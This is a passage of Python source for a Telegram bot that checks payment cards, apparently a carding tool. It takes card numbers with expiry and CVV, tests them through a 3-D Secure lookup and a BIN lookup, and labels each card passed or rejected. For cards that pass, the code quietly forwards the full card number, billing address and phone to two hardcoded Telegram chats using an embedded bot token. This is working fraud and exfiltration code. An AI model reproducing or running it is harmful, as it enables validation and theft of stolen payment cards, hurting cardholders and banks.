Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
		return
	start_time = time.time()
	last= str(vbv(cc))
	try: data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6]).json()
	except: pass
	try:
	    level = data['level']
	except:
	    level = 'Unknown'
	try:
		brand = data['brand']
	except:
		brand = 'Unknown'
	try:
		card_type = data['type']
	except:
		card_type = 'Unknown'
	try:
		country = data['country']
		country_flag = data['country_flag']
	except:
		country = 'Unknown'
		country_flag = 'Unknown'
	try:
		bank = data['bank']
	except:
		bank = 'Unknown'
	end_time = time.time()
	execution_time = end_time - start_time
	print(last)
	hh = 'authenticate_successful'
	dd = '𝗥𝗲𝗷𝗲𝗰𝘁𝗲𝗱 ❌'
	
	msg=f'''<b>𝗣𝗔𝗦𝗦𝗘𝗗  ✅ 
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑪𝑨𝑹𝑫  ➜ <code>{cc}</code>
◆ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 ➜ {gate}
◆ 𝑹𝑬𝑺𝑷𝑶𝑵𝑺𝑬 ➜ {hh}
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝑰𝑵 ➜ <code>{cc[:6]} - {card_type} - {brand}</code>
◆ 𝑩𝑨𝑵𝑲 ➜ <code>{bank}</code>
◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ <code>{country} - {country_flag}</code> 
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝒀: @Moha_Azouz
◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
	msgd=f'''<b>𝗥𝗘𝗝𝗘𝗖𝗧𝗘𝗗 ❌
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑪𝑨𝑹𝑫  ➜ <code>{cc}</code>
◆ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 ➜ {gate}
◆ 𝑹𝑬𝑺𝑷𝑶𝑵𝑺𝑬 ➜ {dd}
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝑰𝑵 ➜ <code>{cc[:6]} - {card_type} - {brand}</code>
◆ 𝑩𝑨𝑵𝑲 ➜ <code>{bank}</code>
◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ <code>{country} - {country_flag}</code> 
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝒀: @Moha_Azouz
◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
	if 'Authenticate Attempt Successful' in last or 'Authenticate Successful' in last or 'authenticate_successful' in last:
		tok = '7256336819:AAGOA4MBllwqF0XrP44Nfl1lS8xQK9Vb8GY'
		acc =  '-1002111411217'
		mg = f"""<b> 
❆═══𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁═══❆
｢𝙲𝙲」➔ <code>{cc}</code>
❆═══𝙸𝙽𝙵𝙾═══❆
｢𝙱𝙸𝙽」➔ <code>{cc[:6]}</code>
｢𝙸𝙽𝙵𝙾」➔ <code>{brand} - {card_type} - {level}</code>
｢𝙱𝙰𝙽𝙺」➔ <code>{bank}</code>
｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ <code>{country} - {country_flag}</code>
❆═══𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁═══❆
✪ 𝙼𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ➔ @JI_NS
✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @Moha_Azouz
</b>"""
		tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
		tlg_params = {"parse_mode": "HTML"}
		tok = '7256336819:AAGOA4MBllwqF0XrP44Nfl1lS8xQK9Vb8GY'
		acb =  '-1002046977369'
		mag = f"""<b>
{cc}|{street}|{city}|{postal}|{phone}|UNITED STATES
</b>"""
		tly = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acb}&text={mag}"
		tly_params = {"parse_mode": "HTML"}
		a = requests.post(tly, params=tly_params)
		i = requests.post(tlg, params=tlg_params)
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg)
	else:
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text= msgd)
@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def menu_callback(call):
	id=call.from_user.id
	stopuser[f'{id}']['status'] = 'stop'

	
print("تم تشغيل البوت")
while True:
	try:
		bot.polling(none_stop=True)
	except Exception as e:
		print(f"حدث خطأ: {e}")